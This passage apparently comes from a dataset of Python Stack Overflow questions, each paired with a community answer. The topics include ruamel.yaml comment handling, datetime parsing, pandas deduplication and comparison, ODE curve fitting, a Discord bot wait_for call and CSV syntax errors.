XXX.com, register an app and get your auth keys!&quot;,\n    &quot;api_secret&quot;: &quot;Think of this as the password that represents your account when using the app.\\n# Head over to XXX.com, register an app and get your auth keys!&quot;\n  }\n}\n<\/code><\/pre>\n<p>I now want to load over these metadata items and add comments to the respective fields in the <code>yaml_config<\/code>. Remember, the <code>metadata<\/code> and the <code>dump<\/code> schema are the same. The <code>dump<\/code> and <code>metadata<\/code> can be any amount of nested dicts, I only included an example above.<\/p>\n<p>I tried the following code to make this work, but it just didn't work... No comments at all or any errors\/exceptions.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>previous_config[field_name].yaml_add_eol_comment(description, _field_name)\n<\/code><\/pre>\n<hr \/>\n<p>The correct output for the above example should be:<\/p>\n<pre class=\"lang-yaml prettyprint-override\"><code>auth:\n    # Think of this as the password that represents your account when using the app.\n    # Head over to XXX.com, register an app and get your auth keys!\n    api_key: ''\n    # Think of this as the password that represents your account when using the app.\n    # Head over to XXX.com, register an app and get your auth keys!\n    api_secret: ''\n<\/code><\/pre>","output_text":"<p>I recommend to always include a full working example of\nwhat fails to do what you want, as now it is not completely clear exactly where\nthings go wrong.\nNew development using <code>ruamel.yaml<\/code> should not use the old API\n(<code>round_trip_load<\/code>\/<code>round_trip_dump<\/code>), but use the new API (instantiating <code>YAML()<\/code>)\nThat API was introduced several years ago and you give no indication that you are\nworking with an ancient <code>ruamel.yaml<\/code> version that requires the use of the limited old API.<\/p>\n<hr \/>\n<p>What you are trying to do can be trivially checked to be possible, by round tripping the end\nresult YAML document and see that can be preserved unchanged:<\/p>\n<pre><code>import sys\nimport ruamel.yaml\n\nyaml_str = &quot;&quot;&quot;\\\nauth:\n    # Think of this as the password that represents your account when using the app.\n    # Head over to XXX.com, register an app and get your auth keys!\n    api_key: ''\n    # Think of this as the password that represents your account when using the app.\n    # Head over to XXX.com, register an app and get your auth keys!\n    api_secret: ''\n&quot;&quot;&quot;\n\nyaml = ruamel.yaml.YAML()\nyaml.indent(mapping=4)\ndata = yaml.load(yaml_str)\nyaml.dump(data, sys.stdout)\n<\/code><\/pre>\n<p>which gives:<\/p>\n<pre><code>auth:\n    # Think of this as the password that represents your account when using the app.\n    # Head over to XXX.com, register an app and get your auth keys!\n    api_key: ''\n    # Think of this as the password that represents your account when using the app.\n    # Head over to XXX.com, register an app and get your auth keys!\n    api_secret: ''\n<\/code><\/pre>\n<p>You can inspect the comment attribute:<\/p>\n<pre><code>print(data['auth'].ca)\n<\/code><\/pre>\n<p>which prints:<\/p>\n<pre><code>Comment(comment=[None, [CommentToken('# Think of this as the password that represents your account when using the app.\\n', line: 1, col: 4), CommentToken('# Head over to XXX.com, register an app and get your auth keys!\\n', line: 2, col: 4)]],\n  items={'api_key': [None, None, CommentToken('\\n    # Think of this as the password that represents your account when using the app.\\n    # Head over to XXX.com, register an app and get your auth keys!\\n', line: 4, col: 4), None]})\n<\/code><\/pre>\n<p>End of line comments occur after other data, that is what the name implies.  In\n<code>ruamel.yaml<\/code> end-of-line comments are usually associated with the key\nof a key-value pair and those are are expected to be on one and the same line, with each other,\nand the comment may extend to the following lines, including any empty lines. For\n<code>ruamel.yaml<\/code> and end-of-line comment does not necessarily have a comment\nat the end-of-the starting line (i.e. that can be empty).<\/p>\n<p>You should also be aware that these (internal) routines are not fixed, will change\nand may stop to work, hopefully not, but sometimes without warning (so fix\nthe version number in your install).<\/p>\n<p>You are making things unnecessary difficult for yourself by associating the\ncomment meta-data, that eventually has to come after the key <code>api-key<\/code>\nof key-value pair <code>api_key: ''<\/code>, with key <code>api-secret<\/code> in your meta-data.\nI'll leave that self-induced problem unsolved.<\/p>\n<p><code>yaml_add_eol_comment()<\/code> always adds a missing initial <code> #<\/code>, cannot add\na multi-line comment of which the &quot;real&quot; end-of-line part is emtpy,\nand requires you to indent the lines of a multi-line comment yourself.<\/p>\n<p>You can also see in the output above, that the comment with regards to\n&quot;user name&quot; is attached completely different from the other comment, as this comment\nappears between\nthe key (<code>auth<\/code>) and the value associated with that key (the associated value that is a two key\nvalue). Because of that, that comment needs to be added differently from the\ncomment on key <code>api_key<\/code>:<\/p>\n<pre><code>import sys\nimport ruamel.yaml\n\nyaml_str = &quot;&quot;&quot;\\\nauth:\n    api_key: ''\n    api_secret: ''\n&quot;&quot;&quot;\n\ndef indent_comment(s, indent):\n    return s.replace('\\n', '\\n' + ' ' * indent)\n\nMAPIND = 4\n\nyaml = ruamel.yaml.YAML()\nyaml.indent(mapping=MAPIND)\ndata = yaml.load(yaml_str)\nauth = data['auth']\nauth.yaml_set_start_comment(\n    &quot;Think of this as the user name that represents your account when using the app.\\n&quot;\n    &quot;# Head over to XXX.com, register an app and get your auth keys!&quot;,\n    indent=MAPIND,\n)\nauth.yaml_add_eol_comment('place_holder', 'api_key')\n# correct the assigned comment token\ncai = auth.ca.items['api_key'][2]\ncai.value = indent_comment('\\n# Think of this as the password that represents your account when using the app.\\n# Head over to XXX.com, register an app and get your auth keys!', MAPIND)\n\nyaml.dump(data, sys.stdout)\n<\/code><\/pre>\n<p>which gives your required result:<\/p>\n<pre><code>auth:\n    # Think of this as the user name that represents your account when using the app.\n    # Head over to XXX.com, register an app and get your auth keys!\n    api_key: ''\n    # Think of this as the password that represents your account when using the app.\n    # Head over to XXX.com, register an app and get your auth keys!\n    api_secret: ''\n<\/code><\/pre>\n<p>The above was done with <code>ruamel.yaml==0.17.17<\/code> other version may need adapting.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n time data 'May 10 2021' does not match format '%m %d %Y'<p>I am having trouble printing a formatted time object produced from a string<\/p>\n<p>This is my code:<\/p>\n<pre><code>date_time_str = 'May 10 2021'\ndate_time_obj = datetime. strptime(date_time_str, '%m %d %Y')\nprint(&quot;The type of the date is now&quot;, type(date_time_obj))\n\nThis is the error:\nValueError: time data 'May 10 2021' does not match format '%m %d %Y'\n<\/code><\/pre>","output_text":"<p>As per <a href=\"https:\/\/www.programiz.com\/python-programming\/datetime\/strptime\" rel=\"nofollow noreferrer\">This<\/a> link, for a month in the <code>Month<\/code> format, you need to use <code>%B<\/code> , and for a month in the <code>Mth<\/code> format ('Apr','Jun') , use <code>%b<\/code>.<\/p>\n<p>You were using <code>%m<\/code>, which is used for numerical numbers.<\/p>\n<p>The below works as an example:<\/p>\n<pre><code>import time\nimport datetime\nfrom time import strptime\nprint(&quot;hello world&quot;)\ndate_time_str = 'May 10 2021'\ndate_time_obj = strptime(date_time_str, '%B %d %Y')\nprint(&quot;The type of the date is now&quot;, date_time_obj)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python: how to write a wrapper to make all variables decalared inside a function globals?<p>I want a function to be run as if it was written in the main program, i.e. all the variables defined therein can be accessed from the main program. I don't know if there's a way to do that, but I thought a wrapper that gives this behaviour would be cool. It's just hacky and I don't know how to start writing it.<\/p>","output_text":"<blockquote>\n  <p>I have pieces of code written inside functions, and I really want to run them and have all the variables defined therein after run without having to write the lengthy return statements. How can I do that? <\/p>\n<\/blockquote>\n\n<p>That's what classes are for. Write a class with all your functions as methods, and use instance attributes to store the shared state. Problem solved, no global required.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Best way to edit nested list for specific problem?<p>I have a question and different ideas on how to approach it, but I'd like to know what more experienced programmers would do.<\/p>\n<p><strong>Background:<\/strong>\nI have a nested list, with sub lists, that always have two items, that looks like this: [[category, item];[category, item];...]. categories and items are strings. There are items that end with a number or float and there are others, that end with just characters or spaces. Some (but not all) items are duplicates.<\/p>\n<p><strong>Problem:<\/strong>\nJust focused on the items, categories do not need to be altered. Do not suggest to use dict or something else, it needs to be a nested list like above.<\/p>\n<ol>\n<li>I need to delete every duplicate, that does not end with a number\/float - so just one of the 1-10 duplicates remains in the list.<\/li>\n<li>If there are duplicates (same items), that end with numbers, I need to sum up all numbers\/floats and just leave one entry with the summed up number and delete the original ones.<\/li>\n<\/ol>\n<p><strong>Example:<\/strong><\/p>\n<p><em>Input:<\/em><\/p>\n<pre><code>[[&quot;fruits&quot;, &quot;Apple 1&quot;];[&quot;fruits&quot;, &quot;Apple 2&quot;];[&quot;fruits&quot;, &quot;Apple 5&quot;];[&quot;cooled&quot;, &quot;iced tea 1,5&quot;]; [&quot;cooled&quot;, &quot;iced tea 2&quot;]; [&quot;fruits&quot;; &quot;onions&quot;]; [&quot;fruits&quot;; &quot;onions&quot;];[&quot;fruits&quot;; &quot;onions&quot;];[&quot;frozen&quot;; &quot;Pizza&quot;]\n<\/code><\/pre>\n<p><em>Output:<\/em><\/p>\n<pre><code>[[&quot;fruits&quot;, &quot;Apple 8&quot;];[&quot;cooled&quot;, &quot;iced tea 3,5&quot;];[&quot;fruits&quot;; &quot;onions&quot;];[&quot;frozen&quot;; &quot;Pizza&quot;]\n<\/code><\/pre>\n<p>Any ideas?<\/p>","output_text":"<p>this worked for me<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from collections import Counter\n\nvals = [[&quot;fruits&quot;, &quot;Apple 1&quot;],[&quot;fruits&quot;, &quot;Apple 2&quot;],[&quot;fruits&quot;, &quot;Apple 5&quot;],[&quot;cooled&quot;, &quot;iced tea 1,5&quot;], [&quot;cooled&quot;, &quot;iced tea 2&quot;], [&quot;fruits&quot;, &quot;onions&quot;], [&quot;fruits&quot;, &quot;onions&quot;],[&quot;fruits&quot;, &quot;onions&quot;],[&quot;frozen&quot;, &quot;Pizza&quot;]]\n\ncounters = {}\nothers = {}\nfor sub_list in vals:\n    items = sub_list[1].rsplit(' ', 1)\n    try:\n        num = float(items[-1].replace(',', '.'))\n        if sub_list[0] not in counters.keys():\n            counter = Counter({items[0]: num})\n            counters[sub_list[0]] = counter\n        else:\n            counters[sub_list[0]].update({items[0]: num})\n    except:\n       \n        others[sub_list[0]] = sub_list[1]\n\nmy_result = []\nfor key, counter in counters.items():\n    items = [[key, f&quot;{sub_key} {value}&quot;] for sub_key, value in counter.items()]\n    my_result = my_result + items\nmy_result = my_result + [[key, value] for key, value in others.items()]\nprint(my_result)        \n<\/code><\/pre>\n<p>output<\/p>\n<pre><code>[['fruits', 'Apple 8.0'], ['cooled', 'iced tea 3.5'], ['fruits', 'onions'], ['frozen', 'Pizza']]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Pandas: why can you do arithmetic on series with non-identical indexes, but not comparisons?<p>In Pandas, operations on Series are done with respect to the index. For example:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import pandas as pd\n\nfoo = pd.Series(data=[1, 2, 3, 4, 5], index=[0, 1, 2, 3, 4])\nbar = pd.Series(data=[2, 3, 6, 5, -3], index=[1, 2, 3, 4, 5])\n<\/code><\/pre>\n<p>These two Series have indexes that partially overlap. When I add them, the values in the overlapping parts of the indexes are added, and the parts that don't overlap get <code>NaN<\/code>:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>foo + bar\n<\/code><\/pre>\n<pre><code>0     NaN\n1     4.0\n2     6.0\n3    10.0\n4    10.0\n5     NaN\ndtype: float64\n<\/code><\/pre>\n<pre class=\"lang-py prettyprint-override\"><code>foo - bar\n<\/code><\/pre>\n<pre><code>0    NaN\n1    0.0\n2    0.0\n3   -2.0\n4    0.0\n5    NaN\ndtype: float64\n<\/code><\/pre>\n<p>However, the same logic does not seem to apply when using comparison operators, like <code>==<\/code>, <code>!=<\/code>, <code>&lt;<\/code>, <code>&lt;=<\/code>, <code>&gt;<\/code>, and <code>&gt;=<\/code>. For example:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>foo &gt;= bar\n<\/code><\/pre>\n<pre><code>ValueError: Can only compare identically-labeled Series objects\n<\/code><\/pre>\n<p>I would have expected this to match on the indices in the same way, giving something like<\/p>\n<pre><code>0    NA\n1    True\n2    True\n3    False\n4    True\n5    NA\ndtype: bool\n<\/code><\/pre>\n<p>Why doesn't this happen? And is there a way to workaround this limitation and get the above result in a straightforward way?<\/p>","output_text":"<p>not sure why it is not possible nor what you're trying to accomplish specifically. But this is an idea:<\/p>\n<pre><code>import numpy as np\nimport pandas as pd\n\n\nfoo = pd.Series(data=[1, 2, 3, 4, 5], index=[0, 1, 2, 3, 4])\nbar = pd.Series(data=[2, 3, 6, 5, -3], index=[1, 2, 3, 4, 5])\n\nratio = (foo+bar)\/bar\nfoo_greater = ratio.apply(lambda x: x if np.isnan(x) else True if x&gt;=2 else False)\n\nprint(foo_greater) \n\nReturns:\n\n0      NaN\n1     True\n2     True\n3    False\n4     True\n5      NaN\ndtype: object\n\n<\/code><\/pre>\n<p>Leveraging the fact you can execute addition and division, if the value in &quot;ratio&quot; is not NaN and greater or equal to 2, then foo &gt;= bar, hence True.<\/p>\n<p>Similar logic can be applied for all the other comparison operations.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Filter the duplicate rows of a pandas dataframe, keeping rows with the latest date only<p>I have a pandas dataframe:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>d = {'title':['GrownUps', 'Toy Story', 'Toy Story', 'Avatar', 'Avatar', 'Avatar'], 'year': [2012, 1995, 2000, 2005, 2006, 2010]}\ndataset=pd.DataFrame(d)\n<\/code><\/pre>\n<p>From the dataframe above I want to locate and the duplicate movie title (i.e Toy Story, Avatar). To do so, I use the following code:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>dataset[dataset.duplicated(subset=['title'],keep=False)]\n<\/code><\/pre>\n<p>From the rows returned I would like to keep per duplicate movie the most recent one (e.g the maximum of the column <code>year<\/code>) and store to a list the indexes of the rows not having the maximum year so I can filter them from the initial dataset.<\/p>\n<p>So my final dataset should look like this:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>d = {'title':['GrownUps', 'Toy Story', 'Avatar'], 'year': [2012, 2000, 2010]}\ndataset=pd.DataFrame(d)\n<\/code><\/pre>\n<p><em>I kept only Toy Story of 2000 instead of 1995, and Avatar of year 2010 not 2005 or 2006<\/em><\/p>\n<p>This could be very useful if someone wants to use a different aggregate rather than <code>max()<\/code>, like <code>mean()<\/code>, <code>sum()<\/code>, etc.<\/p>","output_text":"<p>We can sort by ascending order of &quot;year&quot;, then drop duplicates on &quot;title&quot; keeping the last row (since that has the latest year), then restoring the original ordering of rows:<\/p>\n<pre><code>df.sort_values('year').drop_duplicates('title', keep='last').sort_index()\n\n       title  year\n0   GrownUps  2012\n2  Toy Story  2000\n5     Avatar  2010\n<\/code><\/pre>\n<p>This avoids a groupBy operation (which is relatively slower) and  maintains the original ordering of rows.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Discrepancy in curve fit using solutions from solve_ivp and odeint<p>Here's a basic example equation that I am trying to fit to an example data.<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/oeMmE.gif\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/oeMmE.gif\" alt=\"\\frac{dx}{dt} = -k x\" \/><\/a><\/p>\n<p>The goal is to find the best fit of <code>k<\/code> for my data assuming the data follows the above equation. An obvious way to do so is to numerically integrate the equation and then use curve fitting methods to minimise the least squares and get <code>k<\/code>.<\/p>\n<p>Numerically integrating using <a href=\"https:\/\/docs.scipy.org\/doc\/scipy\/reference\/generated\/scipy.integrate.odeint.html\" rel=\"nofollow noreferrer\"><code>odeint<\/code><\/a> and <a href=\"https:\/\/docs.scipy.org\/doc\/scipy\/reference\/generated\/scipy.integrate.solve_ivp.html\" rel=\"nofollow noreferrer\"><code>ivp_solve<\/code><\/a> and using them on <a href=\"https:\/\/docs.scipy.org\/doc\/scipy\/reference\/generated\/scipy.optimize.curve_fit.html\" rel=\"nofollow noreferrer\"><code>curve_fit<\/code><\/a> produced rather drastic differences. The older <code>odeint<\/code> produced a better fit compared to newer <code>solve_ivp<\/code>. Best fit values of <code>k<\/code> are very different too.<\/p>\n<pre><code>Best fit k using ivp = [2.74421966]\nBest fit k using odeint = [161.82220545]\n<\/code><\/pre>\n<p>What could be the reason behind this?<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/2QP69.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/2QP69.png\" alt=\"Discrepancy\" \/><\/a><\/p>\n<pre><code>## SciPy, NumPy etc imports here\n\nN_SAMPLES = 20\nrnd = np.random.default_rng(12345)\ntimes = np.sort(rnd.choice(rnd.uniform(0, 1, 100), N_SAMPLES))\nvals = np.logspace(10, 0.1, N_SAMPLES) + rnd.uniform(0, 1, N_SAMPLES)\n\n\ndef using_ivp(t, k):\n    eqn = lambda t, x, k: -k * x\n    y0 = vals[0]\n    sol = solve_ivp(eqn, t, y0=[y0], args=(k, ),\n                    dense_output=True)\n    return sol.sol(t)[0]\n\ndef using_odeint(t, k):\n    eqn = lambda x, t: -k * x\n    y0 = vals[0]\n    sol = odeint(eqn, y0, t)\n    return sol[:,0]\n    \ntfit = np.linspace(min(times), max(times), 100)\n\n\n#Fitting using ivp\nk_fit1, kcov1 = curve_fit(using_ivp, times, vals, p0=1.3)\nfit1 = using_ivp(tfit, k_fit1)\n\n\n#Fitting using odeint\nk_fit2, kcov2 = curve_fit(using_odeint, times, vals, p0=1.3)\nfit2 = using_odeint(tfit, k_fit2)\n\nplt.figure(figsize=(5, 5))\nplt.plot(times, vals, 'ro', label='data')\nplt.plot(tfit, fit1, 'r-', label='using ivp')\nplt.plot(tfit, fit2, 'b-', label='using odeint')\nplt.legend(loc='best');\n\nprint('Best fit k using ivp = {}\\n'\\\n      'Best fit k using odeint = {}\\n'.\\\n      format(k_fit1, k_fit2))\n<\/code><\/pre>","output_text":"<p>Check again what the input arguments of <code>solve_ivp<\/code> are. The integration interval is given by the first two numbers in the <code>t_span<\/code> argument, so in your application most values in <code>sol.sol(t)<\/code> are obtained via wild extrapolation.<\/p>\n<p>Correct that by giving the interval as <code>[min(t),max(t)]<\/code>.<\/p>\n<p>To get more compatible computations, explicitly set the error tolerances, as the default values need not be equal. For instance <code>atol=1e-22, rtol=1e-9<\/code> so that only the relative tolerance has an effect.<\/p>\n<p>It is curious how you use the <code>args<\/code> mechanism. It was only recently introduced to <code>solve_ivp<\/code> to be more compatible with <code>odeint<\/code>. I would not use it in either case here, as the definition of the parameter and its use is contained in a 3-line block. It has its uses where proper encapsulation and isolation from other code is a real concern.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n python sqlite3 BASE_DIR is not recognized as the name<p>I use Windows 10 and I just start python\n<img src=\"https:\/\/i.stack.imgur.com\/Hk5Mt.png\" alt=\"make the default sqlite3  \" \/><\/p>\n<ol>\n<li><p>why my root code is just <code>'NAME': BASE_DIR \/ 'db.sqlite3'<\/code>,\nWhen searching, many people come up with  <code>'NAME': os.path.join(BASE_DIR, 'db.sqlite3')<\/code>, this way. Why am I only different?<\/p>\n<\/li>\n<li><p>When I try to check the database, it cannot be checked. However, it is possible to update the database through migration.\nHow can I check the make sqlite3 of data?<\/p>\n<\/li>\n<\/ol>\n<pre><code>(fcdjango_env) PS C:\\python_mvt\\fc_community&gt; sqlite3 db.sqlite3\n\nsqlite3: The term 'sqlite3' is not recognized as the name of a cmdlet, function, script file, or operable program.\nCheck the spelling of the name, or if a path was included, verify that the path is correct and try again.\n<\/code><\/pre>","output_text":"<p>You can use <a href=\"https:\/\/docs.python.org\/3\/library\/os.html\" rel=\"nofollow noreferrer\"><code>os<\/code><\/a> module for make address for root of your project<\/p>\n<pre><code>import os \nBASE_DIR = os.path.dirname(os.path.abspath(__file__))\nDB_PATH = os.path.join (BASE_DIR , 'db_test_dir\\database.db')\nprint(DB_PATH)\n<\/code><\/pre>\n<p>and if you want more complex path for file system you can use <a href=\"https:\/\/docs.python.org\/3\/library\/pathlib.html\" rel=\"nofollow noreferrer\"><code>pathlib<\/code><\/a><\/p>\n<p>sorry for my bad english<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Converting list of datetimes to int<p>I have a pandas column that looks like this:<\/p>\n<p><code>df3[['days_till_all_arrive']]<\/code><\/p>\n<pre><code>Int64Index([-7, 92], dtype='int64')\nInt64Index([-20], dtype='int64')\nInt64Index([83, 83], dtype='int64')\nInt64Index([83, 83], dtype='int64')\nInt64Index([92], dtype='int64')\n...\nInt64Index([91], dtype='int64')\nInt64Index([91], dtype='int64')\nInt64Index([91], dtype='int64')\nInt64Index([92], dtype='int64')\nInt64Index([92], dtype='int64')\n<\/code><\/pre>\n<p>It gets created with a function<\/p>\n<pre><code>def days_till_arrival(df):\n    res = []\n    for item in df['ETA']:\n        item = pd.to_datetime(item)\n        res.append((item - datetime.now()).astype('timedelta64[D]'))\n    \n    return res\n<\/code><\/pre>\n<p><code>ETA<\/code> is a list of date values.\nI use it like so:<\/p>\n<pre><code>df3['days_till_all_arrive'] = days_till_arrival(df3)\n<\/code><\/pre>\n<p>I want the values to be normal lists like so:<\/p>\n<pre><code>df3[['days_till_all_arrive']]\n\n[-7, 92]\n[-20]\n[83, 83]\n[83, 83]\n[92]\n...\n[91]\n[91]\n[91]\n[92]\n[92]\n<\/code><\/pre>\n<p>I use <code>.astype('timedelta64[D]')<\/code> on a single value and it does convert it to the value I want of days, but when I use it in that function for multiple values I get more than [-7, 92], instead I get <code>Int64Index([-7, 92], dtype='int64')<\/code>.<\/p>\n<p>How can I achieve that?<\/p>","output_text":"<p>Use <code>list<\/code> with <a href=\"http:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.Timedelta.days.html\" rel=\"nofollow noreferrer\"><code>Timedelta.days<\/code><\/a>:<\/p>\n<pre><code>res.append(list((item - datetime.now()).days))\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to combine two dataframes into one and aggregate common records in python?<p>df1:<\/p>\n<pre><code>Date                Code        Name    Rating        x             y          z\n2022-07-27 00:00:00 OMER       OMERS    I-2       2027983745    2029539000  1555255.31\n2022-07-27 00:00:00 SC        SOCIETY   I-7       389659466.4   391147968.2 1488501.805\n2022-07-27 00:00:00 CD      CORPORATION I-3       2692692761    2694172512  1479750.8\n2022-07-27 00:00:00 PRIN        AGENT   I-3       72990460.96   74455570    1465109.042\n2022-07-27 00:00:00 BF          FUND    S-3       277607047.4   279044540.2 1437492.761\n<\/code><\/pre>\n<p>df2:<\/p>\n<pre><code>Date                     Code             Name      Rating            x       y     z\n2022-07-27 00:00:00      BankA             nan       nan            1052    1052    0\n2022-07-27 00:00:00       CD           CORPORATION   I-3            1943    2000    57\n2022-07-27 00:00:00      CorporationA      nan       nan            1943    3052    1109\n<\/code><\/pre>\n<p>Expected Output:<\/p>\n<pre><code>Date                Code            Name    Rating        x             y          z\n2022-07-27 00:00:00 OMER            OMERS   I-2       2027983745    2029539000  1555255.31\n2022-07-27 00:00:00 SC             SOCIETY  I-7       389659466.4   391147968.2 1488501.805\n2022-07-27 00:00:00 CD          CORPORATION I-3       2692694704    2694174512  1479807.8\n2022-07-27 00:00:00 PRIN           AGENT    I-3       72990460.96   74455570    1465109.042\n2022-07-27 00:00:00 BF              FUND    S-3       277607047.4   279044540.2 1437492.761\n2022-07-27 00:00:00 BankA           nan     nan         1052           1052         0\n2022-07-27 00:00:00 CorporationA    nan     nan         1943           3052        1109\n<\/code><\/pre>\n<p>I want to combined df1 and df2 into one dataframe. In DF2 if the &quot;code&quot;, &quot;Name&quot;,&quot;Rating&quot; are already present in df1, need to sum the values of x,y and z into one row and if not available just append the value in the bottom of the dataframe. Appreciate your help in this! Thank you<\/p>\n<p><img src=\"https:\/\/i.stack.imgur.com\/6dRSg.png\" alt=\"enter image description here\" \/><\/p>","output_text":"<p>You can try <code>pd.concat<\/code> then <code>groupby.agg<\/code><\/p>\n<pre class=\"lang-py prettyprint-override\"><code>cols1 = ['x', 'y', 'z']\ncols2 = ['Code', 'Name', 'Rating']\nd = {col: 'sum' if col in cols1 else 'first' for col in df1.columns}\n\ndf2[cols2] = df2[cols2].fillna('NaN')\nout = (pd.concat([df1, df2], ignore_index=True)\n       .groupby(cols2)\n       .agg(d).reset_index(drop=True))\n<\/code><\/pre>\n<pre><code>print(out)\n\n                  Date          Code         Name Rating              x              y           z\n0  2022-07-27 00:00:00            BF         FUND    S-3  277607047.400  279044540.200 1437492.761\n1  2022-07-27 00:00:00         BankA          NaN    NaN       1052.000       1052.000       0.000\n2  2022-07-27 00:00:00            CD  CORPORATION    I-3 2692694704.000 2694174512.000 1479807.800\n3  2022-07-27 00:00:00  CorporationA          NaN    NaN       1943.000       3052.000    1109.000\n4  2022-07-27 00:00:00          OMER        OMERS    I-2 2027983745.000 2029539000.000 1555255.310\n5  2022-07-27 00:00:00          PRIN        AGENT    I-3   72990460.960   74455570.000 1465109.042\n6  2022-07-27 00:00:00            SC      SOCIETY    I-7  389659466.400  391147968.200 1488501.805\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Discord.py How to get message of mentioned user?<p>I'm updating an older Bot that worked fine before the last updates. And most commands were kinda easy to get to work.\nIn a command, user A should specify another user B and a number. User B is mentioned and the number goes through a class that rolls the number of dice for him\/her. After that has happened and a number has been generated, user B should now name a number that also goes through this class and forms a counter value.\nThis works up to the point where feedback from user B is expected. After that I get the error &quot;Client.wait_for() got an unexpected keyword argument 'author'&quot;.<\/p>\n<pre><code>@bot.command()\nasync def bam(ctx, op: discord.Member, a: int):\n    __wuerfe , __erfolg , __sechs = wurf(a)\n    __wuerfe.clear()\n    while __sechs &gt; 0:\n        ___wuerfe , ___erfolg , ___sechs = wurf(__sechs)\n        ___wuerfe.clear()\n        __sechs = ___sechs\n        ___sechs = 0\n        __erfolg += ___erfolg\n    if __erfolg == 0:\n        await ctx.send(&quot;{} schlug voll daneben!&quot;.format(ctx.message.author.mention))\n    else:\n        await ctx.send(&quot;{} griff &quot;.format(ctx.message.author.mention) + str(op.mention) + &quot; mit **&quot; + str(__erfolg) + &quot;** Erfolgen an! &quot; + str(op.nick) + &quot; gib bitte deinen Wert f\u00fcr physische Verteidigung ein.&quot;)\n        antwort = await bot.wait_for(author = op, timeout=90)\n        antwortVer = antwort.content\n        verteidigung = int(antwortVer)\n\n        wuerfeVer , erfolgVer , sechsVer = wurf(verteidigung)\n        wuerfeVer.clear()\n        while sechsVer &gt; 0:\n            wuerfeVer2 , erfolgVer2 , sechsVer2 = wurf(sechsVer)\n            wuerfeVer2.clear()\n            sechsVer = sechsVer2\n            sechsVer2 = 0\n            erfolgVer += erfolgVer2\n<\/code><\/pre>\n<p>I understand that the strucutres I'm using are outdated, but I can't find a working way to get the mentioned user B and await his answer.<\/p>","output_text":"<p>This is the code i use for this, you can add a timeout still but this can be edited to be whatever member and channel you want(or removed)<\/p>\n<pre><code>def check(message):\n      return message.author == ctx.author and message.channel == ctx.channel\nawait client.wait_for('message', check=check)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Getting SyntaxError for my csv reader code, even though I put in the correct column name<p>My code:<\/p>\n<pre><code>import csv\n\ndef  searchProxy():\n\n     csv_file = csv.reader(open ('C:\/Users\/Keanu\/Documents\/CSV\/07-12-report.csv', 'r'))\n     cardIdentifier = input('Enter proxy')\n\n     for row CardIdentifier in csv_file:\n         if Card Identifier == row[0]:\n             print(row)\n\nprint ('Enter to search card identifier')\nsrc = int(input (&quot;Enter here: &quot;))\n<\/code><\/pre>\n<p>I'm getting this <code>SyntaxError<\/code>:<\/p>\n<pre><code>File &quot;C:\\Users\\Keanu\\Documents\\PythonProjects\\main.py&quot;, line 8\n    for row CardIdentifier in csv_file:\n            ^\nSyntaxError: invalid syntax\nProcess finished with exit code 1\n<\/code><\/pre>\n<p><code>CardIdentifier<\/code> is the name of a column in my csv file, and I'm search through each row. What could be causing the error?<\/p>","output_text":"<p>You can try this:<\/p>\n<pre><code>def searchProxy():\n     csv_file = csv.reader(open ('C:\/Users\/Keanu\/Documents\/CSV\/07-12-report.csv', 'r'))\n     cardIdentifier = input('Enter proxy')\n     for row in csv_file:\n         if cardIdentifier == row[0]: #I don't think row[0] as well I think it is row only\n             print(row)\n<\/code><\/pre>\n<p>You aren't supposed to use space between variable name! You have so, many typos errors in your code as well.<\/p>\n<p>You had wrote somewhere <code>cardIdentifier<\/code> and somewhere <code>CardIdentifier<\/code> which is completely different thing. Just remember main\/one things, you can't give space in variable name, like <code>test csv<\/code> you can either do <code>test_csv<\/code> or <code>testcsv<\/code>, But not space!<\/p>"}
